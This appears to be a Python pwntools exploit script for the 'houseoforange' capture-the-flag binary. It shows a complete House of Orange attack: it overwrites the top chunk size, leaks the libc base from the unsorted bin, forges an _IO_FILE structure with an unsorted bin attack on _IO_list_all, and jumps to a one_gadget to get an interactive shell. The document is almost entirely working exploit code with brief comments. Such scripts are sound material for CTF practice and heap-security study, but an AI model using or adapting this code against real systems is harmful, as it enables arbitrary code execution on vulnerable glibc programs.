from pwn import *

DEBUG = 1

p = process('./houseoforange')
elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')

if DEBUG == 1:
  context.log_level='debug'
  gdb.attach(p)

def sd(content):
  p.send(content)

def sl(content):
  p.sendline(content)

def rv(content):
  p.recvuntil(content)

def build(size,content,price,color):
  rv('choice : ')
  sl('1')
  rv('name :')
  sl(str(size))
  rv('Name :')
  sd(content)
  rv('Orange:')
  sl(str(price))
  rv(':')
  sl(str(color))

def upgrade(size,content,price,color):
  rv('choice : ')
  sl('3')
  rv('name :')
  sl(str(size))
  rv('Name:')
  sd(content)
  rv('Orange: ')
  sl(str(price))
  rv(': ')
  sl(str(color))

def see():
  rv(':')
  sl('2')
  

head=p64(0)+p64(0x21)+p32(1)+p32(31)+p64(0)

#--------------------------------
# first build and upgrade
# edit the top chunk size
build(0x200,'\n',1,1)
upgrade(0x300,'a'*0x200+head+p64(0)+p64(0xdb1),1,1)

#--------------------------------
# then build a chunk that large enough to call brk
# and got a unsorted bin
build(0x1000,'\n',1,1)

#--------------------------------
# split one chunk from unsorted bin and leak libc-base
build(0x200,'\n',1,1)
see()
rv('house : ')
libc_base=u64(p.recv(6)+2*'\x00')-0x3c4b0a
log.info('libc_base = '+hex(libc_base))

#--------------------------------
# upgrade it and use unsorted bin attack to 
# fool the _IO_FILE system
_IO_list_all=libc_base+elf.symbols['_IO_list_all']
_IO_file_jumps=libc_base+elf.symbols['_IO_file_jumps']+0xc0
file_struct=p64(0)+p64(0x61)
file_struct+=p64(0)+p64(_IO_list_all-0x10)
file_struct+=p64(2)+p64(3)
file_struct=file_struct.ljust(0xd8,'\x00')
file_struct+=p64(_IO_file_jumps)
file_struct+=p64(libc_base+0x4526a)

upgrade(0x1000,'a'*0x200+head+file_struct,1,1)

sl('1\n200')

p.interactive()
